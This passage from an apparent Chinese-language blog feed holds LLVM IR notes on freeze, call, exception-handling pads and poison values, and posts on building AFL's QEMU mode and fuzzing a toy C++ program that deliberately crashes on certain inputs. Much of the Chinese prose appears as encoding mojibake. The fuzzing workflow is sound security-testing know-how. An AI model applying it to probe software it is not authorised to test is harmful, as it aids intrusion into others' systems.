æŒ‡ä»¤ç”¨äºåœæ­¢ <a href="https://llvm.org/docs/LangRef.html#undefvalues">undef</a> å’Œ [poison](<a href="https://llvm.org/docs/LangRef">https://llvm.org/docs/LangRef</a>. html#poisonvalues) å€¼ã€‚</p><pre class="language-none"><code class="language-none">#Syntax:&lt;result&gt; &#x3D; freeze ty &lt;val&gt;    ; yields ty:result</code></pre><p><strong>Semantics:</strong></p><p>å¦‚æœå‚æ•°æ˜¯ <code>undef</code> æˆ– <code>poison</code>ï¼Œåˆ™ <code>freeze</code>â€™è¿”å›ä¸€ä¸ªä»»æ„ä½†å›ºå®šçš„ç±»å‹ä¸º ``ty<code>' çš„å€¼ã€‚ å¦åˆ™ï¼Œæ­¤æŒ‡ä»¤ä¸ºç©ºæ“ä½œå¹¶è¿”å›è¾“å…¥å‚æ•°ã€‚ åŒä¸€æ¡</code>freeze<code>æŒ‡ä»¤è¿”å›çš„å€¼çš„æ‰€æœ‰ä½¿ç”¨éƒ½ä¿è¯å§‹ç»ˆéµå®ˆç›¸åŒçš„å€¼ï¼Œè€Œä¸åŒçš„</code>freeze`æŒ‡ä»¤å¯èƒ½ä¼šäº§ç”Ÿä¸åŒçš„å€¼ã€‚</p><p>è™½ç„¶ <code>undef</code> å’Œ <code>poison</code> æŒ‡é’ˆå¯ä»¥è¢«å†»ç»“ï¼Œä½†ç»“æœæ˜¯ä¸€ä¸ªä¸å¯è§£å¼•ç”¨çš„æŒ‡é’ˆã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… <a href="https://llvm.org/docs/LangRef.html#pointeraliasing">æŒ‡é’ˆåˆ«åè§„åˆ™</a> éƒ¨åˆ†ã€‚ å¦‚æœèšåˆå€¼æˆ–å‘é‡è¢«å†»ç»“ï¼Œåˆ™æ“ä½œæ•°æŒ‰å…ƒç´ å†»ç»“ã€‚ ä¸è€ƒè™‘èšåˆçš„å¡«å……ï¼Œå› ä¸ºå¦‚æœä¸å°†å…¶å­˜å‚¨åˆ°å†…å­˜ä¸­å¹¶ä»¥ä¸åŒçš„ç±»å‹åŠ è½½å®ƒï¼Œå®ƒæ˜¯ä¸å¯è§çš„ã€‚</p><pre class="language-none"><code class="language-none"># Example:%w &#x3D; i32 undef%x &#x3D; freeze i32 %w%y &#x3D; add i32 %w, %w         ; undef%z &#x3D; add i32 %x, %x         ; even number because all uses of %x observe                            ; the same value%x2 &#x3D; freeze i32 %w%cmp &#x3D; icmp eq i32 %x, %x2  ; can be true or false; example with vectors%v &#x3D; &lt;2 x i32&gt; &lt;i32 undef, i32 poison&gt;%a &#x3D; extractelement &lt;2 x i32&gt; %v, i32 0    ; undef%b &#x3D; extractelement &lt;2 x i32&gt; %v, i32 1    ; poison%add &#x3D; add i32 %a, %a                      ; undef%v.fr &#x3D; freeze &lt;2 x i32&gt; %v                ; element-wise freeze%d &#x3D; extractelement &lt;2 x i32&gt; %v.fr, i32 0 ; not undef%add.f &#x3D; add i32 %d, %d                    ; even number; branching on frozen value%poison &#x3D; add nsw i1 %k, undef   ; poison%c &#x3D; freeze i1 %poisonbr i1 %c, label %foo, label %bar ; non-deterministic branch to %foo or %bar</code></pre><h4 id="call-ç®€å•å‡½æ•°è°ƒç”¨">call ç®€å•å‡½æ•°è°ƒç”¨</h4><p><code>call</code>æŒ‡ä»¤ä»£è¡¨ä¸€ä¸ªç®€å•çš„å‡½æ•°è°ƒç”¨ã€‚</p><pre class="language-none"><code class="language-none"># Syntax:&lt;result&gt; &#x3D; [tail | musttail | notail ] call [fast-math flags] [cconv] [ret attrs] [addrspace(&lt;num&gt;)]           &lt;ty&gt;|&lt;fnty&gt; &lt;fnptrval&gt;(&lt;function args&gt;) [fn attrs] [ operand bundles ]</code></pre><p><strong><a href="https://llvm.org/docs/LangRef.html#id2116">Arguments:</a></strong></p><p><a href="https://llvm.org/docs/LangRef.html#id2116">https://llvm.org/docs/LangRef.html#id2116</a></p><p><strong>Semantics:</strong></p><p><code>call</code>æŒ‡ä»¤ç”¨äºä½¿æ§åˆ¶æµè½¬ç§»åˆ°æŒ‡å®šå‡½æ•°ï¼Œå…¶ä¼ å…¥å‚æ•°ç»‘å®šåˆ°æŒ‡å®šå€¼ã€‚ åœ¨è¢«è°ƒç”¨å‡½æ•°ä¸­æ‰§è¡Œ<code>ret</code>æŒ‡ä»¤æ—¶ï¼Œæ§åˆ¶æµç»§ç»­æ‰§è¡Œå‡½æ•°è°ƒç”¨ä¹‹åçš„æŒ‡ä»¤ï¼Œå¹¶ä¸”å‡½æ•°çš„è¿”å›å€¼ç»‘å®šåˆ°ç»“æœå‚æ•°ã€‚</p><pre class="language-none"><code class="language-none"># Example:%retval &#x3D; call i32 @test(i32 %argc)call i32 (i8*, ...)* @printf(i8* %msg, i32 12, i8 42)        ; yields i32%X &#x3D; tail call i32 @foo()                                    ; yields i32%Y &#x3D; tail call fastcc i32 @foo()  ; yields i32call void %foo(i8 signext 97)%struct.A &#x3D; type &#123; i32, i8 &#125;%r &#x3D; call %struct.A @foo()                        ; yields &#123; i32, i8 &#125;%gr &#x3D; extractvalue %struct.A %r, 0                ; yields i32%gr1 &#x3D; extractvalue %struct.A %r, 1               ; yields i8%Z &#x3D; call void @foo() noreturn                    ; indicates that %foo never returns normally%ZZ &#x3D; call zeroext i32 @bar()                     ; Return value is %zero extended</code></pre><h4 id="va-arg-å¯å˜å‚æ•°">va_arg å¯å˜å‚æ•°</h4><p><code>va_arg</code>æŒ‡ä»¤ç”¨äºè®¿é—®é€šè¿‡å‡½æ•°è°ƒç”¨çš„<code>variable argumen</code>åŒºåŸŸä¼ é€’çš„å‚æ•°ã€‚ å®ƒç”¨äºåœ¨ C ä¸­å®ç° <code>va_arg</code> å®ã€‚</p><pre class="language-none"><code class="language-none"># Syntax:&lt;resultval&gt; &#x3D; va_arg &lt;va_list*&gt; &lt;arglist&gt;, &lt;argty&gt;</code></pre><p><strong>Example:</strong></p><p>See the <a href="https://llvm.org/docs/LangRef.html#int-varargs">variable argument processing</a> section.</p><h4 id="landingpad">landingpad</h4><p><a href="https://llvm.org/docs/ExceptionHandling.html#overview">LLVM çš„å¼‚å¸¸å¤„ç†ç³»ç»Ÿ</a> ä½¿ç”¨<code>landingpad</code>æŒ‡ä»¤æ¥æŒ‡å®šä¸€ä¸ªåŸºæœ¬å—æ˜¯ä¸€ä¸ªç€é™†åœºâ€”â€”ä¸€ä¸ªå¼‚å¸¸ç€é™†çš„åœ°æ–¹ï¼Œ å¹¶ä¸”å¯¹åº”äºåœ¨ <code>try</code>/<code>catch</code> åºåˆ—çš„ <code>catch</code> éƒ¨åˆ†ä¸­æ‰¾åˆ°çš„ä»£ç ã€‚ å®ƒå®šä¹‰äº† <a href="https://llvm.org/docs/LangRef.html#personalityfn">personality å‡½æ•°</a> åœ¨é‡æ–°è¿›å…¥è¯¥å‡½æ•°æ—¶æä¾›çš„å€¼ã€‚ <code>resultval</code> çš„ç±»å‹ä¸º <code>resultty</code>ã€‚</p><pre class="language-none"><code class="language-none"># Syntax:&lt;resultval&gt; &#x3D; landingpad &lt;resultty&gt; &lt;clause&gt;+&lt;resultval&gt; &#x3D; landingpad &lt;resultty&gt; cleanup &lt;clause&gt;*&lt;clause&gt; :&#x3D; catch &lt;type&gt; &lt;value&gt;&lt;clause&gt; :&#x3D; filter &lt;array constant type&gt; &lt;array constant&gt;</code></pre><pre class="language-none"><code class="language-none"># Example:;; A landing pad which can catch an integer.%res &#x3D; landingpad &#123; i8*, i32 &#125;         catch i8** @_ZTIi;; A landing pad that is a cleanup.%res &#x3D; landingpad &#123; i8*, i32 &#125;         cleanup;; A landing pad which can catch an integer and can only throw a double.%res &#x3D; landingpad &#123; i8*, i32 &#125;         catch i8** @_ZTIi         filter [1 x i8**] [i8** @_ZTId]</code></pre><h4 id="catchpad">catchpad</h4><p><a href="https://llvm.org/docs/ExceptionHandling.html#overview">LLVM çš„å¼‚å¸¸å¤„ç†ç³»ç»Ÿ</a> ä½¿ç”¨<code>catchpad</code>æŒ‡ä»¤æ¥æŒ‡å®šä¸€ä¸ªåŸºæœ¬å—å¼€å§‹ä¸€ä¸ª catch å¤„ç†ç¨‹åº- ä¸ªæ€§ä¾‹ç¨‹è¯•å›¾è½¬ç§»æ§åˆ¶ä»¥æ•è·å¼‚å¸¸çš„ä¸€ç§ã€‚</p><pre class="language-none"><code class="language-none">#Syntax:&lt;resultval&gt; &#x3D; catchpad within &lt;catchswitch&gt; [&lt;args&gt;*]</code></pre><pre class="language-none"><code class="language-none">#Example:dispatch:  %cs &#x3D; catchswitch within none [label %handler0] unwind to caller  ;; A catch block which can catch an integer.handler0:  %tok &#x3D; catchpad within %cs [i8** @_ZTIi]</code></pre><h4 id="cleanuppad">cleanuppad</h4><p>LLVM çš„å¼‚å¸¸å¤„ç†ç³»ç»Ÿä½¿ç”¨<code>cleanuppad</code>æŒ‡ä»¤æ¥æŒ‡å®šåŸºæœ¬å—æ˜¯æ¸…ç†å—- ä¸ªæ€§ä¾‹ç¨‹è¯•å›¾è½¬ç§»æ§åˆ¶ä»¥è¿è¡Œæ¸…ç†æ“ä½œçš„ä¸€ç§ã€‚</p><pre class="language-none"><code class="language-none"># Syntax:&lt;resultval&gt; &#x3D; cleanuppad within &lt;parent&gt; [&lt;args&gt;*]</code></pre><pre class="language-none"><code class="language-none"># Example:%tok &#x3D; cleanuppad within %cs []</code></pre><h3 id="Poison-Values"><a href="https://llvm.org/docs/LangRef.html#id1607">Poison Values</a></h3><p>A poison value é”™è¯¯æ“ä½œçš„ç»“æœã€‚.</p><p>ä¸ºäº†ä¿ƒè¿›æ¨æµ‹æ‰§è¡Œï¼Œè®¸å¤šæŒ‡ä»¤åœ¨æä¾›éæ³•æ“ä½œæ•°æ—¶ä¸ä¼šç«‹å³è°ƒç”¨æœªå®šä¹‰è¡Œä¸ºï¼Œè€Œæ˜¯è¿”å›<code>poison value </code>ã€‚</p><p>å­—ç¬¦ä¸² <code>poison</code> å¯ä»¥åœ¨ä»»ä½•éœ€è¦å¸¸é‡çš„åœ°æ–¹ä½¿ç”¨ï¼Œå¹¶ä¸”å¸¦æœ‰ <code>nsw</code> æ ‡å¿—çš„ <a href="https://llvm.org/docs/LangRef.html#i-add">add</a> ç­‰æ“ä½œå¯ä»¥äº§ç”Ÿpoison valueã€‚</p><p>Most instructions return â€˜<code>poison</code>â€™ when one of their arguments is â€˜<code>poison</code>â€™. A notable exception is the <a href="https://llvm.org/docs/LangRef.html#i-select">select instruction</a>. Propagation of poison can be stopped with the <a href="https://llvm.org/docs/LangRef.html#i-freeze">freeze instruction</a>.</p><p>It is correct to replace a poison value with an <a href="https://llvm.org/docs/LangRef.html#undefvalues">undef value</a> or any value of the type.</p><p>This means that immediate undefined behavior occurs if a poison value is used as an instruction operand that has any values that trigger undefined behavior. Notably this includes (but is not limited to):</p><ul><li>The pointer operand of a <a href="https://llvm.org/docs/LangRef.html#i-load">load</a>, <a href="https://llvm.org/docs/LangRef.html#i-store">store</a> or any other pointer dereferencing instruction (independent of address space).</li><li>The divisor operand of a <code>udiv</code>, <code>sdiv</code>, <code>urem</code> or <code>srem</code> instruction.</li><li>The condition operand of a <a href="https://llvm.org/docs/LangRef.html#i-br">br</a> instruction.</li><li>The callee operand of a <a href="https://llvm.org/docs/LangRef.html#i-call">call</a> or <a href="https://llvm.org/docs/LangRef.html#i-invoke">invoke</a> instruction.</li><li>The parameter operand of a <a href="https://llvm.org/docs/LangRef.html#i-call">call</a> or <a href="https://llvm.org/docs/LangRef.html#i-invoke">invoke</a> instruction, when the function or invoking call site has a <code>noundef</code> attribute in the corresponding position.</li><li>The operand of a <a href="https://llvm.org/docs/LangRef.html#i-ret">ret</a> instruction if the function or invoking call site has a noundef attribute in the return value position.</li></ul><p>Here are some examples:</p><pre class="language-none"><code class="language-none">entry:  %poison &#x3D; sub nuw i32 0, 1           ; Results in a poison value.  %poison2 &#x3D; sub i32 poison, 1         ; Also results in a poison value.  %still_poison &#x3D; and i32 %poison, 0   ; 0, but also poison.  %poison_yet_again &#x3D; getelementptr i32, i32* @h, i32 %still_poison  store i32 0, i32* %poison_yet_again  ; Undefined behavior due to                                       ; store to poison.  store i32 %poison, i32* @g           ; Poison value stored to memory.  %poison3 &#x3D; load i32, i32* @g         ; Poison value loaded back from memory.  %narrowaddr &#x3D; bitcast i32* @g to i16*  %wideaddr &#x3D; bitcast i32* @g to i64*  %poison4 &#x3D; load i16, i16* %narrowaddr ; Returns a poison value.  %poison5 &#x3D; load i64, i64* %wideaddr   ; Returns a poison value.  %cmp &#x3D; icmp slt i32 %poison, 0       ; Returns a poison value.  br i1 %cmp, label %end, label %end   ; undefined behaviorend:</code></pre></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> LLVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
            <tag> LLVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL(american Fuzzy Lop)å­¦ä¹ ä¸€-è¡¥å……QEMUæ¨¡å¼</title>
      <link href="/posts/4bf8181c/"/>
      <url>/posts/4bf8181c/</url>
      
        <content type="html"><![CDATA[<h1>QEMUæ¨¡å¼æµ‹è¯•</h1><blockquote><p>@2022-04-10</p><p>@sizaif</p></blockquote><h2 id="ç¼–è¯‘QEMU">ç¼–è¯‘QEMU</h2><div class="story post-story"><p>å‚è€ƒ<code>README.qemu</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">$./build_qemu_support.sh<span class="token comment"># Cannot use 'python', Python 2.6 or later is required.Note that Python 3 or later is not yet supported.</span><span class="token comment"># å®‰è£…ä¾èµ–ï¼Œå°†pythoné“¾æ¥åˆ°python2ä¸Š</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libtool,libtool-bin,bison,libgtk2.0-dev,python2<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>AFL binary-only instrumentation QEMU build script<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Performing basic sanity checks<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All checks passed<span class="token operator">!</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cryptographic signature on qemu-2.10.0.tar.xz checks out.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uncompressing archive <span class="token punctuation">(</span>this will take a <span class="token keyword">while</span><span class="token punctuation">)</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Unpacking successful.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Configuring QEMU <span class="token keyword">for</span> <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Applying patches<span class="token punctuation">..</span>.patching <span class="token function">file</span> linux-user/elfload.cpatching <span class="token function">file</span> accel/tcg/cpu-exec.cpatching <span class="token function">file</span> linux-user/syscall.cpatching <span class="token function">file</span> configurepatching <span class="token function">file</span> util/memfd.c<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Patching done.Install prefix    /usr/localBIOS directory    /usr/local/share/qemubinary directory  /usr/local/binlibrary directory /usr/local/libmodule directory  /usr/local/lib/qemulibexec directory /usr/local/libexecinclude directory /usr/local/includeconfig directory  /usr/local/etc<span class="token builtin class-name">local</span> state directory   /usr/local/varManual directory  /usr/local/share/manELF interp prefix /usr/gnemul/qemu-%MSource path       /home/workhome/AFL/qemu_mode/qemu-2.10.0C compiler        ccHost C compiler   ccC++ compiler      c++Objective-C compiler ccARFLAGS           rvCFLAGS            -O2 -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE<span class="token operator">=</span><span class="token number">2</span> -g -O3 -ggdbQEMU_CFLAGS       -I/usr/include/pixman-1 -I<span class="token variable"><span class="token variable">$(</span>SRC_PATH<span class="token variable">)</span></span>/dtc/libfdt -pthread -I/usr/include/glib-2.0 -I/usr/lib/x86_64-linux-gnu/glib-2.0/include -fPIE -DPIE -m64 -mcx16 -D_GNU_SOURCE -D_FILE_OFFSET_BITS<span class="token operator">=</span><span class="token number">64</span> -D_LARGEFILE_SOURCE -Wstrict-prototypes -Wredundant-decls -Wall -Wundef -Wwrite-strings -Wmissing-prototypes -fno-strict-aliasing -fno-common -fwrapv  -Wexpansion-to-defined -Wendif-labels -Wno-shift-negative-value -Wno-missing-include-dirs -Wempty-body -Wnested-externs -Wformat-security -Wformat-y2k -Winit-self -Wignored-qualifiers -Wold-style-declaration -Wold-style-definition -Wtype-limits -fstack-protector-strongLDFLAGS           -Wl,--warn-common -Wl,-z,relro -Wl,-z,now -pie -m64 -g<span class="token function">make</span>              <span class="token function">make</span><span class="token function">install</span>           <span class="token function">install</span>python            python -Bsmbd              /usr/sbin/smbdmodule support    no<span class="token function">host</span> CPU          x86_64<span class="token function">host</span> big endian   notarget list       x86_64-linux-usergprof enabled     nosparse enabled    nostrip binaries    <span class="token function">yes</span>profiler          nostatic build      nopixman            systemSDL support       noGTK support       noGTK GL support    noVTE support       noTLS priority      NORMALGNUTLS support    noGNUTLS rnd        nolibgcrypt         nolibgcrypt kdf     nonettle            nonettle kdf        nolibtasn1          nocurses support    novirgl support     no<span class="token function">curl</span> support      nomingw32 support   noAudio drivers     ossBlock whitelist <span class="token punctuation">(</span>rw<span class="token punctuation">)</span>Block whitelist <span class="token punctuation">(</span>ro<span class="token punctuation">)</span>VirtFS supportVNC support       noxen support       nobrlapi support    nobluez  support    noDocumentation     noPIE               <span class="token function">yes</span>vde support       nonetmap support    noLinux AIO support noATTR/XATTR support <span class="token function">yes</span>Install blobs     <span class="token function">yes</span>KVM support       <span class="token function">yes</span>HAX support       noTCG support       <span class="token function">yes</span>TCG debug enabled noTCG interpreter   noRDMA support      nofdt support       <span class="token function">yes</span>preadv support    <span class="token function">yes</span>fdatasync         <span class="token function">yes</span>madvise           <span class="token function">yes</span>posix_madvise     <span class="token function">yes</span>libcap-ng support novhost-net support <span class="token function">yes</span>vhost-scsi support <span class="token function">yes</span>vhost-vsock support <span class="token function">yes</span>vhost-user support <span class="token function">yes</span>Trace backends    logspice support     norbd support       noxfsctl support    nosmartcard support nolibusb            nousb net redir     noOpenGL support    noOpenGL dmabufs    nolibiscsi support  nolibnfs support    nobuild guest agent <span class="token function">yes</span>QGA VSS support   noQGA w32 disk info noQGA MSI support   noseccomp support   nocoroutine backend ucontextcoroutine pool    <span class="token function">yes</span>debug stack usage nocrypto afalg      noGlusterFS support nogcov              gcovgcov enabled      noTPM support       <span class="token function">yes</span>libssh2 support   noTPM passthrough   <span class="token function">yes</span>QOM debugging     <span class="token function">yes</span>Live block migration <span class="token function">yes</span>lzo support       nosnappy support    no<span class="token function">bzip2</span> support     noNUMA <span class="token function">host</span> support notcmalloc support  nojemalloc support  noavx2 optimization <span class="token function">yes</span>replication support <span class="token function">yes</span>VxHS block device no<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Configuration complete.</code></pre><h3 id="gettid-é”™è¯¯">gettid é”™è¯¯</h3><blockquote><p>error: static declaration of â€˜gettidâ€™ follows non-static declaration  261 | _syscall0(int, gettid)</p></blockquote><p><a href="https://blog.csdn.net/geniusle201/article/details/111028697">AFL QEMUæ¨¡å¼å®‰è£…æŠ¥é”™ï¼ˆafl-2.52b &amp; qemu-2.10.0ï¼‰[å·²è§£å†³]</a></p><h3 id="util-memfd-c-40-12-error-static-declaration-of-â€˜memfd-create-é”™è¯¯">util/memfd.c:40:12: error: static declaration of â€˜memfd_create é”™è¯¯</h3><p><a href="https://blog.csdn.net/liyihao17/article/details/109981662">ã€AFL-qemuå®‰è£…é—®é¢˜ã€‘å‡ºç°util/memfd.c:40:12: error: static declaration of â€˜memfd_createâ€™ follows non-static d</a></p><pre class="language-shell" data-language="shell"><code class="language-shell">$ ./build_qemu_support.shÂ·Â·Â·Â·Â·Â·Â·Â·çœç•¥ç¼–è¯‘è¿‡ç¨‹Â·Â·Â·Â·Â·Â·Â·Â·<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Build process successful<span class="token operator">!</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Copying binary<span class="token punctuation">..</span>.-rwxr-xr-x <span class="token number">1</span> root root <span class="token number">14238392</span> Apr <span class="token number">10</span> 07:54 <span class="token punctuation">..</span>/afl-qemu-trace<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Successfully created <span class="token string">'../afl-qemu-trace'</span><span class="token builtin class-name">.</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Testing the build<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Instrumentation tests passed.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All set, you can now use the -Q mode <span class="token keyword">in</span> afl-fuzz<span class="token operator">!</span><span class="token comment"># å°†afl-qemu-trace æ”¾åˆ°ä¸afl-fuzz åŒç›®å½•ä¸‹(/usr/local/bin) å¹¶å°†æ­¤ç›®å½•æ·»åŠ åˆ°ç¯å¢ƒå˜é‡å³å¯</span></code></pre></div><h2 id="ç¼–å†™C-ä»£ç æµ‹è¯•">ç¼–å†™C++ä»£ç æµ‹è¯•</h2><div class="story post-story"><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;signal.h&gt;using namespace std;void test (string buf) &#123;    int len &#x3D; buf.length();    if (( len &#x3D;&#x3D; 6  &amp;&amp; buf[0] &#x3D;&#x3D; &#39;s&#39; &amp;&amp; buf[1]&#x3D;&#x3D;&#39;i&#39; &amp;&amp; buf[2]&#x3D;&#x3D;&#39;z&#39;)||(len &gt;&#x3D;7 &amp;&amp; buf[0]&#x3D;&#x3D;&#39;x&#39; &amp;&amp; buf[1]&#x3D;&#x3D;&#39;i&#39; &amp;&amp; buf[2]&#x3D;&#x3D;&#39;d&#39; &amp;&amp; buf[3]&#x3D;&#x3D;&#39;i&#39;&amp;&amp; buf[4]&#x3D;&#x3D;&#39;a&#39; &amp;&amp; buf[5]&#x3D;&#x3D;&#39;n&#39;))&#123;        cout&lt;&lt;&quot;awesome found sizaif !&quot;&lt;&lt;endl;        raise(SIGSEGV);    &#125;    else&#123;        cout&lt;&lt;&quot;sorry not&quot;&lt;&lt;endl;    &#125;&#125;int main(int argc, char *argv[]) &#123;    string buf &#x3D; &quot;&quot;;    cin&gt;&gt;buf;    test(buf);    return 0;&#125;</code></pre></div><h2 id="ç¼–è¯‘å¹¶è¿›è¡Œfuzz">ç¼–è¯‘å¹¶è¿›è¡Œfuzz</h2><div class="story post-story"><pre class="language-bash" data-language="bash"><code class="language-bash">$ root@2d34b521fdd5:/home/workhome/afl-test/insc++<span class="token comment"># afl-fuzz -Q -i in -o crash_qemu ./afltestc++2</span>afl-fuzz <span class="token number">2</span>.57b by <span class="token operator">&lt;</span>lcamtuf@google.com<span class="token operator">></span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> You have <span class="token number">16</span> CPU cores and <span class="token number">4</span> runnable tasks <span class="token punctuation">(</span>utilization: <span class="token number">25</span>%<span class="token punctuation">)</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Try parallel <span class="token function">jobs</span> - see /usr/local/share/doc/afl/parallel_fuzzing.txt.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking CPU core loadout<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found a <span class="token function">free</span> CPU core, binding to <span class="token comment">#0.</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking core_pattern<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting up output directories<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Output directory exists but deemed OK to reuse.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Deleting old session data<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Output <span class="token function">dir</span> cleanup successful.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanning <span class="token string">'in'</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> No auto-generated dictionary tokens to reuse.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating hard links <span class="token keyword">for</span> all input files<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Validating target binary<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Attempting dry run with <span class="token string">'id:000000,orig:t.txt'</span><span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Spinning up the fork server<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All right - fork server is up.    len <span class="token operator">=</span> <span class="token number">6</span>, map size <span class="token operator">=</span> <span class="token number">58</span>, <span class="token builtin class-name">exec</span> speed <span class="token operator">=</span> <span class="token number">3060</span> us<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All <span class="token builtin class-name">test</span> cases processed.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Here are some useful stats:    Test <span class="token keyword">case</span> count <span class="token builtin class-name">:</span> <span class="token number">1</span> favored, <span class="token number">0</span> variable, <span class="token number">1</span> total       Bitmap range <span class="token builtin class-name">:</span> <span class="token number">58</span> to <span class="token number">58</span> bits <span class="token punctuation">(</span>average: <span class="token number">58.00</span> bits<span class="token punctuation">)</span>        Exec timing <span class="token builtin class-name">:</span> <span class="token number">3060</span> to <span class="token number">3060</span> us <span class="token punctuation">(</span>average: <span class="token number">3060</span> us<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> No -t option specified, so I'll use <span class="token builtin class-name">exec</span> <span class="token function">timeout</span> of <span class="token number">20</span> ms.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> All <span class="token builtin class-name">set</span> and ready to roll<span class="token operator">!</span></code></pre><p><img src="https://s2.loli.net/2022/04/10/G5xzSqXviWnOQud.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/10/G5xzSqXviWnOQud.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220410161439855"></p><h3 id="crash">crash</h3><p><img src="https://s2.loli.net/2022/04/10/l3wubpCoiO6FxPd.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/10/l3wubpCoiO6FxPd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220410161922597"></p></div>]]></content>
      
      
      <categories>
          
          <category> Master </category>
          
          <category> è®ºæ–‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
            <tag> è®ºæ–‡ </tag>
            
            <tag> AFL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL(american Fuzzy Lop)å­¦ä¹ ä¸€</title>
      <link href="/posts/9cd8386/"/>
      <url>/posts/9cd8386/</url>
      
        <content type="html"><![CDATA[<h1>AFL(american fuzzy lop)å­¦ä¹ ä¸€</h1><blockquote><p>@sizaif</p><p>@2022-04-09</p></blockquote><h2 id="AFL-çš„æ¨¡ç³Šæ–¹æ³•">AFL çš„æ¨¡ç³Šæ–¹æ³•</h2><div class="story post-story"><ol><li>åŸºäºæ”¹è¿›çš„è¾¹ç¼˜è¦†ç›–</li><li>æ’æ¡©æ³•å¼•å¯¼çš„é—ä¼ ç®—æ³•</li></ol><p><strong>æµç¨‹ï¼š</strong></p><p><strong>æ’æ¡©</strong></p><p><img src="https://s2.loli.net/2022/04/09/iUJThAQBZNGXF62.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/iUJThAQBZNGXF62.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20211201143448119"></p><ol><li><p>ä»æºç ç¼–è¯‘ç¨‹åºæ—¶è¿›è¡Œæ’æ¡©ï¼Œä»¥è®°å½•ä»£ç è¦†ç›–ç‡ï¼ˆCode Coverageï¼‰ï¼›</p></li><li><p>é€‰æ‹©ä¸€äº›è¾“å…¥æ–‡ä»¶ï¼Œä½œä¸ºåˆå§‹æµ‹è¯•é›†åŠ 